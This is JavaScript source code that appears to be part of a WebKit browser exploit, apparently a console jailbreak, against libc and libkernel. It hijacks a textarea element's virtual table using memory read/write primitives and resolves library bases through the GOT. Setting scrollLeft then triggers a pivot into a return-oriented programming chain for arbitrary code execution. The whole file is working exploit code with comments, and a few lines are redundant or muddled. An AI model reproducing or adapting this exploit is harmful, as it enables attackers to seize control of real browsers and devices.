const FAKE_VT_SIZE = 0x400; // Fake VTable size (memory block for storing vtable data)
const FAKE_VTABLE_SIZE = 0x2000; // Fake VTable memory block size
const PLT_ENTRY_SIZE = 16; // The size of each PLT entry in the GOT (Global Offset Table)
const OFFSET_TO_VT_PTR = 0x18; // Offset to the virtual table pointer in an object
const SAVEALL_VT_OFFSET = 0x1d8; // Offset in fake_vtable for the 'saveall' address
const FAKE_VT_PTR_OFFSET = 0x38; // Offset for fake_vt_ptr in fake_vtable

//
// Allocates memory and sets up the fake VTable using the real VTable's data
// This enables the manipulation of function pointers for our ROP-chain's
// ------------------------------------------------------------------------------------------------
var tarea = document.createElement('textarea');
// Leak the real virtual table pointer from the textarea object.
var real_vt_ptr = read_ptr_at(addrof(tarea) + OFFSET_TO_VT_PTR);
var fake_vt_ptr = malloc(FAKE_VT_SIZE);
// Copy the real virtual table data into a fake VTable.
write_mem(fake_vt_ptr, read_mem(real_vt_ptr, FAKE_VT_SIZE));
// Leak the real virtual table pointer and allocate memory for the fake VTable.
var real_vtable = read_ptr_at(fake_vt_ptr);
var fake_vtable = malloc(FAKE_VTABLE_SIZE);
write_mem(fake_vtable, read_mem(real_vtable, FAKE_VTABLE_SIZE));
// Set the fake VTable in the fake VTable pointer.
write_ptr_at(fake_vt_ptr, fake_vtable);
// Backup the fake VTable pointer to restore later.
var fake_vt_ptr_bak = malloc(FAKE_VT_SIZE);
write_mem(fake_vt_ptr_bak, read_mem(fake_vt_ptr, FAKE_VT_SIZE));
// Calculate PLT pointer (part of the GOT table for dynamic linking)
var plt_ptr = read_ptr_at(fake_vtable) - 10063176;
// ------------------------------------------------------------------------------------------------

/**
 * Retrieves the address from the Global Offset Table (GOT) for a specific index.
 * This function interprets the raw data and returns the correct address.
 * @param {number} idx - The index in the PLT/GOT table.
 * @returns {number} The address corresponding to the GOT entry.
 */
function get_got_addr(idx) {
    var p = plt_ptr + idx * PLT_ENTRY_SIZE; // Pointer to the specific PLT entry for given index
    var q = read_mem(p, 6); // 6 Bytes of memory read from the PLT entry
    var offset = 0; // Stores the resolved address offset
    
    // Ensure that the entry is valid
    if (q[0] !== 0xff || q[1] !== 0x25) 
        throw "invalid GOT entry";
    
    // Loop through bytes at indices 5, 4, 3, and 2 in the array q
    // Reconstruct the offset by shifting it left (multiply by 256) and adding the byte q[i]
    // This takes q[i] and shifts the previous value of offset to make space for the new byte
    for (let i = 5; i >= 2; i--) offset = offset * 256 + q[i];
    
    offset += p + 6; // Add the offset from the GOT entry
    return read_ptr_at(offset); // Return the resolved address
}

// These are not real bases but rather some low addresses
var webkit_base = read_ptr_at(fake_vtable);
var libkernel_base = get_got_addr(705) - 0x10000;
var libc_base = get_got_addr(582);
var saveall_addr = libc_base + 0x2e2c8;
var loadall_addr = libc_base + 0x3275c;
var setjmp_addr = libc_base + 0xbfae0;
var longjmp_addr = libc_base + 0xbfb30;
var pivot_addr = libc_base + 0x327d2;
var infloop_addr = libc_base + 0x447a0;
var jop_frame_addr = libc_base + 0x715d0;
var get_errno_addr_addr = libkernel_base + 0x9ff0;
var pthread_create_addr = libkernel_base + 0xf980;

/**
 * Saves the state of the fake VTable and performs a ROP chain setup to jump to `saveall_addr`.
 * This function is part of the ROP chain setup for executing arbitrary code.
 * @returns {Array} The memory buffer with saved state.
 */
function saveall() {
    var ans = malloc(0x800);
    var bak = read_ptr_at(fake_vtable + SAVEALL_VT_OFFSET);
    // Prepare to hijack the VTable by redirecting it to `saveall_addr`
    write_ptr_at(fake_vtable + SAVEALL_VT_OFFSET, saveall_addr);
    write_ptr_at(addrof(tarea) + OFFSET_TO_VT_PTR, fake_vt_ptr);
    tarea.scrollLeft = 0; // Trigger the scroll event to activate the ROP chain.
    write_ptr_at(addrof(tarea) + OFFSET_TO_VT_PTR, real_vt_ptr);
    write_mem(ans, read_mem(fake_vt_ptr, FAKE_VT_SIZE)); // Save state
    write_mem(fake_vt_ptr, read_mem(fake_vt_ptr_bak, FAKE_VT_SIZE)); // Restore fake VTable pointer
    var bak = read_ptr_at(fake_vtable + SAVEALL_VT_OFFSET);
    write_ptr_at(fake_vtable + SAVEALL_VT_OFFSET, saveall_addr); // Overwrite again
    write_ptr_at(fake_vt_ptr + FAKE_VT_PTR_OFFSET, 0x1234); // Another ROP setup
    write_ptr_at(addrof(tarea) + OFFSET_TO_VT_PTR, fake_vt_ptr);
    tarea.scrollLeft = 0; // Trigger again
    write_ptr_at(addrof(tarea) + OFFSET_TO_VT_PTR, real_vt_ptr);
    write_mem(ans + 0x400, read_mem(fake_vt_ptr, FAKE_VT_SIZE)); // Continue saving state
    write_mem(fake_vt_ptr, read_mem(fake_vt_ptr_bak, FAKE_VT_SIZE)); // Restore
    return ans; // Return the saved state
}

/**
 * PUBLIC ROP API
 * Executes a ROP chain by jumping to the `pivot_addr` after setting up the necessary state.
 * The ROP chain is constructed starting at `buf + 8`, and execution jumps to `pivot_addr`.
 * @param {number} buf - The address of the start of the ROP chain.
 */
function pivot(buf) {
    var ans = malloc(0x400);
    var bak = read_ptr_at(fake_vtable + SAVEALL_VT_OFFSET);
    // Set up the VTable and hijack execution to `saveall_addr`
    write_ptr_at(fake_vtable + SAVEALL_VT_OFFSET, saveall_addr);
    write_ptr_at(addrof(tarea) + OFFSET_TO_VT_PTR, fake_vt_ptr);
    tarea.scrollLeft = 0; // Trigger the scroll event
    write_ptr_at(addrof(tarea) + OFFSET_TO_VT_PTR, real_vt_ptr);
    write_mem(ans, read_mem(fake_vt_ptr, FAKE_VT_SIZE)); // Save state
    write_mem(fake_vt_ptr, read_mem(fake_vt_ptr_bak, FAKE_VT_SIZE)); // Restore fake VTable pointer
    var bak = read_ptr_at(fake_vtable + SAVEALL_VT_OFFSET);
    write_ptr_at(fake_vtable + SAVEALL_VT_OFFSET, pivot_addr); // Overwrite with pivot address
    write_ptr_at(fake_vt_ptr + FAKE_VT_PTR_OFFSET, buf); // Set ROP buffer address
    // Adjust the ROP frame to point to the correct address
    write_ptr_at(ans + 0x38, read_ptr_at(ans + 0x38) - 16);
    write_ptr_at(buf, ans);
    write_ptr_at(addrof(tarea) + OFFSET_TO_VT_PTR, fake_vt_ptr);
    tarea.scrollLeft = 0; // Trigger again
    write_ptr_at(addrof(tarea) + OFFSET_TO_VT_PTR, real_vt_ptr);
    write_mem(fake_vt_ptr, read_mem(fake_vt_ptr_bak, FAKE_VT_SIZE)); // Restore the fake VTable
}
